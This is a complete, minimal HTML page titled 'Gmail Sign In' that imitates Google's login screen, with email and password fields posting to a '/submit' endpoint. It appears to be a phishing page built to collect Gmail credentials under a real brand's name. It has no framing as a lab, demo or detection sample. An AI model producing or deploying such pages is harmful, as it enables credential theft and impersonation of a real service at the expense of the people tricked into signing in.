<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Sign In</title>
</head>
<body style="font-family: Arial, sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
    <div style="background-color: white; padding: 20px; border-radius: 5px; width: 300px; text-align: center;">
        <h1 style="color: #4285f4;">Sign in</h1>
        <form action="/submit">
            <input type="email" name="email" placeholder="Email or phone" required style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;">
            <input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;">
            <button type="submit" style="width: 100%; padding: 8px; background-color: #4285f4; color: white; border: none; border-radius: 4px;">Sign In</button>
        </form>
        <p style="font-size: 12px; margin-top: 10px;">
            <a href="#" style="text-decoration: none;">Forgot email?</a>
        </p>
        <p style="font-size: 12px;">
            Don't have an account? <a href="#" style="text-decoration: none;">Create account</a>
        </p>
    </div>
</body>
</html>
